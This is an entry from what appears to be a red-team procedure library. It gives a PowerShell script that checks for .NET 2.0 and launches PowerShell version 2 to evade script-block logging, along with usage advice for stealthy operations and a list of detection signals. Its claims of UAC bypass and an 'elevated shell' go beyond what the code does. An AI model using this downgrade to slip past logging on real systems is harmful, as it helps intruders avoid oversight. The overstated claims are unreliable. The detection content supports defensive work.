---
id: 3d0cdb89-54b9-4785-8326-b799df734331
name: Check-DotNet-Version-and-Launch-PowerShell-v2
type: code
language: powershell
verified: true
created_at: '2023-04-06T03:56:26.092157+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
tags:
  - powershell
  - uac-bypass
  - logging-bypass
  - privilege-escalation
platforms:
  - Windows
validated: true
---

# Check-DotNet-Version-and-Launch-PowerShell-v2

## Code

```powershell
if ($ShowOnly -eq $True)
{
        Write-Output "If .Net version 2.0.50727 is installed, run powershell -v 2 and run scripts from the new PowerShell process."
}
else
{
        Write-Verbose "Checking if .Net version 2.0.50727 is installed."
        $versions = Get-ChildItem 'HKLM:\SOFTWARE\Microsoft\NET Framework Setup\NDP' -recurse | Get-ItemProperty -name Version -EA 0 | Where { $_.PSChildName -match '^(?!S)\p{L}'} | Select -ExpandProperty Version
    if($versions -match "2.0.50727")
    {
            Write-Verbose ".Net version 2.0.50727 found."
            Write-Output "Executing the bypass."
            powershell.exe -version 2
    }
    else
    {
            Write-Verbose ".Net version 2.0.50727 not found. Can't start PowerShell v2."
    }
}
```

## Description

This PowerShell script checks for the presence of .NET Framework version 2.0.50727 in the Windows registry. If found, it launches a new PowerShell v2 session, enabling legacy execution that bypasses WMF5 autologging and facilitates UAC evasion via reflection techniques. If $ShowOnly is $true, it outputs instructions without performing the check or launch. This code is used in privilege escalation scenarios to create a stealthy elevated shell.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| $ShowOnly | Boolean flag to show instructions only without executing the check or launch | $true or $false |

## Usage

Save the code as a .ps1 file and execute in an elevated PowerShell prompt with -ExecutionPolicy Bypass. Set $ShowOnly = $false to perform the bypass. Once launched, the v2 session can be used for further reflection-based loads (e.g., dynamic assembly invocation) in procedures like [[procedures/Reflection-Method-with-WMF5-Autologging-Bypass-using-PowerShell-v2]]. Ideal for red team operations on Windows 10+ where logging must be minimized.

## Detection

- Monitor PowerShell process creation with CommandLine containing "-version 2" via Sysmon or EDR tools.
- Registry access to HKLM:\SOFTWARE\Microsoft\NET Framework Setup\NDP (Event ID 4657 in Security log).
- Anomalous v2 runtime launches without corresponding module logging (check for absence of Event IDs 4103-4104).
- Behavioral analytics for reflection loads (e.g., Add-Type or [runspacefactory] usage in script blocks).

## Related

- [[procedures/Reflection-Method-with-WMF5-Autologging-Bypass-using-PowerShell-v2]]
